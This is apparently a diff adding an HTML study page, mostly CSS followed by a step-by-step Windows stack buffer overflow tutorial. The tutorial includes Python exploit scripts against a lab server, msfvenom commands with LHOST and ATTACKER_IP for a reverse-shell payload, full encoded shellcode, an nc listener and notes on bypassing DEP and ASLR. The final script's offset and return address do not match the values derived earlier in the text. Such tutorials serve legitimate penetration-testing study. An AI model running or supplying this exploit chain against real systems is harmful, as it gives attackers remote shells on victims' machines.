+  .swal2-icon.swal2-info {
+    border-color: #9de0f6;
+    color: #3fc3ee; }
+  .swal2-icon.swal2-question {
+    border-color: #c9dae1;
+    color: #87adbd; }
+  .swal2-icon.swal2-success {
+    border-color: #a5dc86; }
+    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 3.75em;
+      height: 7.5em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.4375em;
+        left: -2.0635em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 3.75em 3.75em;
+                transform-origin: 3.75em 3.75em;
+        border-radius: 7.5em 0 0 7.5em; }
+      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.6875em;
+        left: 1.875em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 0 3.75em;
+                transform-origin: 0 3.75em;
+        border-radius: 0 7.5em 7.5em 0; }
+    .swal2-icon.swal2-success .swal2-success-ring {
+      position: absolute;
+      top: -.25em;
+      left: -.25em;
+      width: 100%;
+      height: 100%;
+      border: 0.25em solid rgba(165, 220, 134, 0.3);
+      border-radius: 50%;
+      z-index: 2;
+      box-sizing: content-box; }
+    .swal2-icon.swal2-success .swal2-success-fix {
+      position: absolute;
+      top: .5em;
+      left: 1.625em;
+      width: .4375em;
+      height: 5.625em;
+      -webkit-transform: rotate(-45deg);
+              transform: rotate(-45deg);
+      z-index: 1; }
+    .swal2-icon.swal2-success [class^='swal2-success-line'] {
+      display: block;
+      position: absolute;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #a5dc86;
+      z-index: 2; }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 2.875em;
+        left: .875em;
+        width: 1.5625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: 2.375em;
+        right: .5em;
+        width: 2.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+
+.swal2-progresssteps {
+  align-items: center;
+  margin: 0 0 1.25em;
+  padding: 0;
+  font-weight: 600; }
+  .swal2-progresssteps li {
+    display: inline-block;
+    position: relative; }
+  .swal2-progresssteps .swal2-progresscircle {
+    width: 2em;
+    height: 2em;
+    border-radius: 2em;
+    background: #3085d6;
+    color: #fff;
+    line-height: 2em;
+    text-align: center;
+    z-index: 20; }
+    .swal2-progresssteps .swal2-progresscircle:first-child {
+      margin-left: 0; }
+    .swal2-progresssteps .swal2-progresscircle:last-child {
+      margin-right: 0; }
+    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
+      background: #3085d6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
+        background: #add8e6; }
+      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
+        background: #add8e6; }
+  .swal2-progresssteps .swal2-progressline {
+    width: 2.5em;
+    height: .4em;
+    margin: 0 -1px;
+    background: #3085d6;
+    z-index: 10; }
+
+[class^='swal2'] {
+  -webkit-tap-highlight-color: transparent; }
+
+.swal2-show {
+  -webkit-animation: swal2-show 0.3s;
+          animation: swal2-show 0.3s; }
+  .swal2-show.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+.swal2-hide {
+  -webkit-animation: swal2-hide 0.15s forwards;
+          animation: swal2-hide 0.15s forwards; }
+  .swal2-hide.swal2-noanimation {
+    -webkit-animation: none;
+            animation: none; }
+
+[dir='rtl'] .swal2-close {
+  right: auto;
+  left: 0; }
+
+.swal2-animate-success-icon .swal2-success-line-tip {
+  -webkit-animation: swal2-animate-success-line-tip 0.75s;
+          animation: swal2-animate-success-line-tip 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-line-long {
+  -webkit-animation: swal2-animate-success-line-long 0.75s;
+          animation: swal2-animate-success-line-long 0.75s; }
+
+.swal2-animate-success-icon .swal2-success-circular-line-right {
+  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
+          animation: swal2-rotate-success-circular-line 4.25s ease-in; }
+
+.swal2-animate-error-icon {
+  -webkit-animation: swal2-animate-error-icon 0.5s;
+          animation: swal2-animate-error-icon 0.5s; }
+  .swal2-animate-error-icon .swal2-x-mark {
+    -webkit-animation: swal2-animate-error-x-mark 0.5s;
+            animation: swal2-animate-error-x-mark 0.5s; }
+
+@-webkit-keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }
+
+@keyframes swal2-rotate-loading {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg); }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg); } }</style></head>
+    <body>
+        <fieldset class="box">
+            <legend>Identification</legend>
+                <ul>
+                    <li><span>First step is to identify the vulnerability. You can debug the app and fuzz it with larger strings and identify the approximate length that causes the crash. We can script it as follows:</span></li>
+                <pre><code><span class="blue">import</span>&nbsp;socket
+
+#&nbsp;Create&nbsp;an&nbsp;array&nbsp;of&nbsp;buffers,&nbsp;<span class="blue">from</span>&nbsp;10&nbsp;to&nbsp;2000,&nbsp;<span class="blue">with</span>&nbsp;increments&nbsp;of&nbsp;20.
+counter&nbsp;=&nbsp;100
+fuzz_strings&nbsp;=&nbsp;[<span class="green">"A"</span>]
+
+while&nbsp;<span class="green">len</span>(fuzz_strings)&nbsp;&lt;=&nbsp;30:
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">fuzz_strings.append</span>(<span class="green">"A"</span>&nbsp;*&nbsp;counter)
+&nbsp;&nbsp;&nbsp;&nbsp;counter&nbsp;=&nbsp;counter&nbsp;+&nbsp;200
+
+for&nbsp;fuzz&nbsp;<span class="blue">in</span>&nbsp;fuzz_strings:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"Fuzzing with %s bytes"</span>&nbsp;%&nbsp;<span class="green">len</span>(fuzz)
+&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;<span class="green">socket.socket</span>(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+&nbsp;&nbsp;&nbsp;&nbsp;connect&nbsp;=&nbsp;<span class="green">s.connect</span>((<span class="green">'192.168.0.9'</span>,&nbsp;80))
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.send</span>(<span class="green">'GET '</span>&nbsp;+&nbsp;fuzz&nbsp;+&nbsp;<span class="green">'\r\n\r\n'</span>&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">s.recv</span>(1024)
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.close</span>()</code></pre>
+                    <li><span>We run the script and find that the app crashes when sending a string <strong>2700</strong> long, so we know that the buffer is somewhere between <strong>2500</strong> and <strong>2700</strong>.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Finding EIP</legend>
+                <ul>
+                    <li><span>Second step is to find the exact size of the buffer before the EIP register. We can achieve this by generating a string with unique sequence of characters and use the debugger to find the value that overwrites the EIP register. We create the string as follows:</span></li>
+                <pre><code>$&nbsp;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb&nbsp;-l&nbsp;2700</code></pre>
+                    <li><span>We add the string to our script:</span></li>
+                <pre><code><span class="blue">import</span>&nbsp;socket
+
+s&nbsp;=&nbsp;<span class="green">socket.socket</span>(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+buffer=<span class="green">'STRING'</span>
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nSending evil buffer..."</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.connect</span>((<span class="green">'192.168.0.9'</span>,&nbsp;80))
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.send</span>(<span class="green">'GET '</span>&nbsp;+&nbsp;buffer&nbsp;+&nbsp;<span class="green">'\r\n\r\n'</span>)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">s.recv</span>(1024)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nDone!."</span>
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"Could not connect"</span></code></pre>
+                    <li><span>Send the payload and find the value of EIP, and find the exact length needed with:</span></li>
+                <pre><code>$&nbsp;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb&nbsp;-l&nbsp;<span class="green">STRING_LENGTH</span>(2700)&nbsp;-q&nbsp;<span class="green">EIP_VALUE</span>(37694236)
+
+[*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;2606</code></pre>
+                    <li><span>We know that the buffer size before the EIP is 2606.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Finding a JMP ESP</legend>
+                <ul>
+                    <li><span>Our objective is to inject a shellcode in beginning of the stack, replace the <strong>EIP</strong> with the address of the <strong>ESP</strong> and get the execution flow redirected to our shellcode. The problem is that the amount of data loaded in the stack changes at every execution, so we can not predict the value of the ESP address. We can work around this by finding a JMP ESP instruction in memory from a module that has no <strong>DES</strong> or <strong>ASLR</strong>, and change our EIP to point to that address.</span></li>
+                    <li><span>To find the modules that don't have ASLR and DES, you can run within the ImmunityDebugger:</span></li>
+                <pre><code>!mona&nbsp;modules</code></pre>
+                    <li><span>Now, you can see how the asm <strong>JMP_ESP</strong> looks like in machine code by running:</span></li>
+                <pre><code>#&nbsp;/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm&nbsp;&gt;&nbsp;jmp&nbsp;esp
+&nbsp;&nbsp;&nbsp;&nbsp;00000000&nbsp;FFE4&nbsp;jmp&nbsp;esp
+nasm&nbsp;&gt;</code></pre>
+                    <li><span>Now you can find <strong>FFE4</strong> with:</span></li>
+                <pre><code>!mona&nbsp;<span class="red">find</span>&nbsp;-s&nbsp;<span class="green">'\xff\xe4'</span>&nbsp;-m&nbsp;module.dll</code></pre>
+                    <li><span>It will find some addrs such as <strong>0x5f4a358f</strong>, since x86 is little endian, to have it properly read from the stack we need to encode it as <strong> \x8f\x35\x4a\x5f</strong>.</span></li>
+                    <li><span>We will add our shellcode after the EIP JMP instruction (of about 400 bytes), so our payload will look like:</span></li>
+                <pre><code>Padding&nbsp;+&nbsp;JMP&nbsp;ESP&nbsp;+&nbsp;shellcode</code></pre>
+                    <li><span>Using the previous buffer size and address:</span></li>
+                <pre><code><span class="green">'A'</span>&nbsp;*&nbsp;2606&nbsp;+&nbsp;\x8f\x35\x4a\x5f&nbsp;+&nbsp;<span class="green">'C'</span>&nbsp;*&nbsp;400</code></pre>
+                    <li><span>So, the new exploit looks like this:</span></li>
+                <pre><code><span class="blue">import</span>&nbsp;socket
+
+s&nbsp;=&nbsp;<span class="green">socket.socket</span>(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+buffer&nbsp;=&nbsp;<span class="green">'A'</span>&nbsp;*&nbsp;2606&nbsp;+&nbsp;\x8f\x35\x4a\x5f&nbsp;+&nbsp;<span class="green">'C'</span>&nbsp;*&nbsp;400
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nSending evil buffer..."</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.connect</span>((<span class="green">'192.168.0.9'</span>,&nbsp;80))
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.send</span>(<span class="green">'GET '</span>&nbsp;+&nbsp;buffer&nbsp;+&nbsp;<span class="green">'\r\n\r\n'</span>)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">s.recv</span>(1024)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nDone!."</span>
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"Could not connect"</span></code></pre>
+                    <li><span>We will set a breakpoint to that memory location <strong>5f4a358f</strong> and run the new exploit. We go to CPU view, right click, go to, expression and the address. Press F2 in ImmunityDebugger to set the breakpoint, the debugger should pause when sending the payload, and stepping into the next instruction (F7) should jump to a the top of the stack, where there should be 400 C. If there are less 'C', then the input has been truncated and you will probably need a bigger buffer to fit your shellcode.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Finding bad characters</legend>
+                <ul>
+                    <li><span>Next step is to generate a shellcode. Before doing that, we need to know what characters the application allows. We will send a buffer that contains all the ASCII characters:</span></li>
+                <pre><code><span class="blue">import</span>&nbsp;socket
+
+s&nbsp;=&nbsp;<span class="green">socket.socket</span>(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+badchars&nbsp;=&nbsp;(
+<span class="green">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</span>
+<span class="green">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</span>
+<span class="green">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</span>
+<span class="green">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</span>
+<span class="green">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</span>
+<span class="green">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</span>
+<span class="green">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</span>
+<span class="green">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</span>
+<span class="green">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</span>
+<span class="green">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</span>
+<span class="green">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</span>
+<span class="green">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</span>
+<span class="green">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</span>
+<span class="green">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</span>
+<span class="green">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</span>
+<span class="green">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"</span>
+)
+buffer&nbsp;=&nbsp;<span class="green">"A"</span>&nbsp;*&nbsp;2606&nbsp;+&nbsp;<span class="green">"B"</span>&nbsp;*&nbsp;4&nbsp;+&nbsp;badchars
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nSending evil buffer..."</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.connect</span>((<span class="green">'192.168.0.10'</span>,&nbsp;110))
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.send</span>(<span class="green">'GET '</span>&nbsp;+&nbsp;buffer&nbsp;+&nbsp;<span class="green">'\r\n\r\n'</span>)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">s.recv</span>(1024)
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.close</span>()
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nDone!"</span>
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"Could not connect"</span></code></pre>
+                    <li><span>We run it, right click in the ESP address, and follow in dump to find potential bad characters that the application truncates. We should see the full ASCII character space. Some characters are more likely to be truncated (i.e. <strong>0x00</strong> as it is the end of string delimiter in C. In Pop3, new line char <strong>0xA</strong> as it is the command separator, etc..).</span></li>
+                    <li><span>So we know how much padding we need to add to the stack to overwrite the EIP, we know an address that will get the execution flow redirected to the start of the stack, we just need to create a shellcode.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Injecting a shellcode</legend>
+                <ul>
+                    <li><span>First step, is to generate the shellcode. You can list all available payloads in metasploit:</span></li>
+                <pre><code>$&nbsp;msfpayload&nbsp;-l</code></pre>
+                    <li><span>Generate a reverse shell shellcode.</span></li>
+                <pre><code>$&nbsp;msfpayload&nbsp;windows/shell_reverse_tcp&nbsp;<span class="blue">LHOST=192.168.0.10</span>&nbsp;LPORT=443&nbsp;&nbsp;-f&nbsp;c</code></pre>
+                    <li><span>The payload will contain illegal characters, you can filter those out using *msfencode*:</span></li>
+                <pre><code>$&nbsp;msfpayload&nbsp;windows/shell_reverse_tcp&nbsp;<span class="blue">LHOST=192.168.0.10</span>&nbsp;LPORT=443&nbsp;R&nbsp;|&nbsp;msfencode&nbsp;-b&nbsp;<span class="green">"\x00\x0a\x0d"</span></code></pre>
+                    <li><span>Generic windows reverse shell:</span></li>
+                <pre><code>$&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=ATTACKER_IP&nbsp;LPORT=443&nbsp;-f&nbsp;&nbsp;c&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-b&nbsp;<span class="green">"\x00\x0a\x0d"</span></code></pre>
+                    <li><span>In the end, you are going to have a shellcode as the following one:</span></li>
+                <pre><code>root@kali:~/oscp/bo_miniserver#&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;<span class="blue">LHOST=192.168.0.4</span>&nbsp;LPORT=443&nbsp;-f&nbsp;&nbsp;c&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-b&nbsp;<span class="green">"\x00\x0d"</span>
+Final&nbsp;size&nbsp;of&nbsp;c&nbsp;file:&nbsp;1500&nbsp;bytes
+unsigned&nbsp;<span class="blue">char</span>&nbsp;buf[]&nbsp;=
+<span class="green">"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"</span>
+<span class="green">"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"</span>
+<span class="green">"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"</span>
+<span class="green">"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"</span>
+<span class="green">"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"</span>
+<span class="green">"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"</span>
+<span class="green">"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"</span>
+<span class="green">"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"</span>
+<span class="green">"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"</span>
+<span class="green">"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"</span>
+<span class="green">"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"</span>
+<span class="green">"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"</span>
+<span class="green">"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"</span>
+<span class="green">"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"</span>
+<span class="green">"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"</span>
+<span class="green">"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"</span>
+<span class="green">"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"</span>
+<span class="green">"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"</span>
+<span class="green">"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"</span>
+<span class="green">"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"</span>
+<span class="green">"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"</span>
+<span class="green">"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"</span>
+<span class="green">"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"</span>
+<span class="green">"\xbb\x02\x75\xde\xbc\x06"</span>;</code></pre>
+                    <li><span>The shellcode needs to be decoded in memory, which means we need extra space in the stack. We can achieve this by adding some NOPs before the shellcode, so our buffer looks like this:</span></li>
+                <pre><code><span class="green">"A"</span>*2606&nbsp;+&nbsp;<span class="green">"\x8f\x35\x4a\x5f"</span>&nbsp;+&nbsp;<span class="green">"\x90"</span>&nbsp;*&nbsp;8&nbsp;+&nbsp;shellcode</code></pre>
+                    <li><span>We add the shellcode to the previous Poc:</span></li>
+                <pre><code><span class="blue">import</span>&nbsp;socket
+
+s&nbsp;=&nbsp;<span class="green">socket.socket</span>(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+shellcode&nbsp;=&nbsp;(
+<span class="green">"\xbf\x09\x50\xa4\x04\xdb\xd3\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"</span>
+<span class="green">"\x52\x31\x7e\x12\x83\xc6\x04\x03\x77\x5e\x46\xf1\x7b\xb6\x04"</span>
+<span class="green">"\xfa\x83\x47\x69\x72\x66\x76\xa9\xe0\xe3\x29\x19\x62\xa1\xc5"</span>
+<span class="green">"\xd2\x26\x51\x5d\x96\xee\x56\xd6\x1d\xc9\x59\xe7\x0e\x29\xf8"</span>
+<span class="green">"\x6b\x4d\x7e\xda\x52\x9e\x73\x1b\x92\xc3\x7e\x49\x4b\x8f\x2d"</span>
+<span class="green">"\x7d\xf8\xc5\xed\xf6\xb2\xc8\x75\xeb\x03\xea\x54\xba\x18\xb5"</span>
+<span class="green">"\x76\x3d\xcc\xcd\x3e\x25\x11\xeb\x89\xde\xe1\x87\x0b\x36\x38"</span>
+<span class="green">"\x67\xa7\x77\xf4\x9a\xb9\xb0\x33\x45\xcc\xc8\x47\xf8\xd7\x0f"</span>
+<span class="green">"\x35\x26\x5d\x8b\x9d\xad\xc5\x77\x1f\x61\x93\xfc\x13\xce\xd7"</span>
+<span class="green">"\x5a\x30\xd1\x34\xd1\x4c\x5a\xbb\x35\xc5\x18\x98\x91\x8d\xfb"</span>
+<span class="green">"\x81\x80\x6b\xad\xbe\xd2\xd3\x12\x1b\x99\xfe\x47\x16\xc0\x96"</span>
+<span class="green">"\xa4\x1b\xfa\x66\xa3\x2c\x89\x54\x6c\x87\x05\xd5\xe5\x01\xd2"</span>
+<span class="green">"\x1a\xdc\xf6\x4c\xe5\xdf\x06\x45\x22\x8b\x56\xfd\x83\xb4\x3c"</span>
+<span class="green">"\xfd\x2c\x61\x92\xad\x82\xda\x53\x1d\x63\x8b\x3b\x77\x6c\xf4"</span>
+
+<span class="green">"\x5c\x78\xa6\x9d\xf7\x83\x21\x62\xaf\x8b\xb5\x0a\xb2\x8b\xb4"</span>
+<span class="green">"\x71\x3b\x6d\xdc\x95\x6a\x26\x49\x0f\x37\xbc\xe8\xd0\xed\xb9"</span>
+<span class="green">"\x2b\x5a\x02\x3e\xe5\xab\x6f\x2c\x92\x5b\x3a\x0e\x35\x63\x90"</span>
+<span class="green">"\x26\xd9\xf6\x7f\xb6\x94\xea\xd7\xe1\xf1\xdd\x21\x67\xec\x44"</span>
+<span class="green">"\x98\x95\xed\x11\xe3\x1d\x2a\xe2\xea\x9c\xbf\x5e\xc9\x8e\x79"</span>
+<span class="green">"\x5e\x55\xfa\xd5\x09\x03\x54\x90\xe3\xe5\x0e\x4a\x5f\xac\xc6"</span>
+<span class="green">"\x0b\x93\x6f\x90\x13\xfe\x19\x7c\xa5\x57\x5c\x83\x0a\x30\x68"</span>
+<span class="green">"\xfc\x76\xa0\x97\xd7\x32\xd0\xdd\x75\x12\x79\xb8\xec\x26\xe4"</span>
+<span class="green">"\x3b\xdb\x65\x11\xb8\xe9\x15\xe6\xa0\x98\x10\xa2\x66\x71\x69"</span>
+<span class="green">"\xbb\x02\x75\xde\xbc\x06"</span>
+)
+buffer&nbsp;=&nbsp;<span class="green">"A"</span>&nbsp;*&nbsp;1787&nbsp;+&nbsp;<span class="green">"\x7E\x6E\xEF\x77"</span>&nbsp;+&nbsp;<span class="green">"\x90"</span>&nbsp;*&nbsp;8&nbsp;+&nbsp;shellcode
+try:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nSending evil buffer..."</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.connect</span>((<span class="green">'192.168.0.9'</span>,&nbsp;80))
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">s.send</span>(<span class="green">'GET '</span>&nbsp;+&nbsp;buffer&nbsp;+&nbsp;<span class="green">'\r\n\r\n'</span>)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">s.recv</span>(1024)
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"\nDone!."</span>
+except:
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<span class="green">"Could not connect"</span></code></pre>
+                    <li><span>We run:</span></li>
+                <pre><code>$&nbsp;nc&nbsp;-lvp&nbsp;443</code></pre>
+                    <li><span>We should get a reverse shell, we can debug the previous memory address to identify potential problems.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>MsfPayloads</legend>
+                <ul>
+                    <li><span>staged payload is send in two parts to the victim. The first part is a small primary payload that do that the victim machine connect to the attacker machine and later the attack machine sends the second part of the payload. It is useful when the buffer has not a big length. (eg. linux/x64/shell/reverse_tcp)</span></li>
+                    <li><span>Non-staged (linux/x64/shell_reverse_tcp), larger but full shell.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Countermeasures</legend>
+                <ul>
+                    <li><span><strong>Code signing</strong> executable page of memory is signed, and instructions executed only if the signature is correct.</span></li>
+                    <li><span><strong>SEHOP</strong> checks the validity of a thread’s exception handler list before allowing any to be called.</span></li>
+                    <li><span><strong>Pointer encoding</strong> Function pointers can be encoded (using XOR or other means) within Microsoft Visual Studio and GCC. If encoded pointers are overwritten without applying the correct XOR operation first, they cause a program crash.</span></li>
+                    <li><span><strong>Stack canaries</strong> Compilers including Microsoft Visual Studio, GCC, and LLVM Clang place canaries on the stack before important values (e.g., saved eip and function pointers on the stack). The value of the canary is checked before the function returns; if it has been modified, the program crashes.</span></li>
+                    <li><span><strong>Heap protection</strong> Sanity checking within heap management code. These improvements protect against double free and heap overflows resulting in control structures being overwritten.</span></li>
+                    <li><span><strong>Relocation read-only (RELRO)</strong> The GOT, destructors, and constructors entries within the data segment can be protected through instructing the GCC linker to resolve all dynamically linked functions at runtime, and marking the entries read-only.</span></li>
+                    <li><span><strong>Format string protection</strong> Most compilers provide protection against format string attacks.</span></li>
+                    <li><span><strong>Data execution prevention (DEP)</strong> is used to mark writable areas of memory, including the stack and the heap, as non-executable. CPU can set a bit NX (no-excutable) to portions of the stack.</span></li>
+                    <li><span><strong>Address space layout randomization (ASLR)</strong> makes it difficult for an attacker to commandeer logical program flow; however, implementation flaws exist, and some libraries are compiled without ASLR support.</span></li>
+                    <li><span><strong>Bypassing DEP</strong> DEP prevents the execution of arbitrary instructions from writable areas of memory. As such, you must identify and borrow useful instructions from the executable text segment to achieve your goals. The challenge is one of identifying sequences of useful instructions that can be used to form return-oriented programming (ROP) chains. It involves looking for snippets of code called ROP gatgets within the legitimate modules of the application that execute some interesting instructions and return the execution flow. For example, if the first task of the exploit is to pop EAX we will look for a pop eax; ret in the module and we will replace EIP with its address. We can chain multiple gadgets to write an exploit. The goal is to find a memory protection API such as VirtualProtect and mark the stack as executable and then the JMP ESP. The gadgets need to be in a module that does not support ASLR and DEP.</span></li>
+                    <li><span>In order to prevent this, ASLR was developed. ASLR randomizes at runtime/boot time the addresses of the structures and modules to make it difficult to guess the location of ROP gadgets.</span></li>
+                    <li><span>There are a few ways to <strong>bypass ASLR</strong>:</span></li>
+                    <li><span><strong>Direct RET overwrite</strong>: Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a jmp esp.</span></li>
+                    <li><span><strong>Partial EIP overwrite</strong>: Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. We still need a non-ASLR module for this though.</span></li>
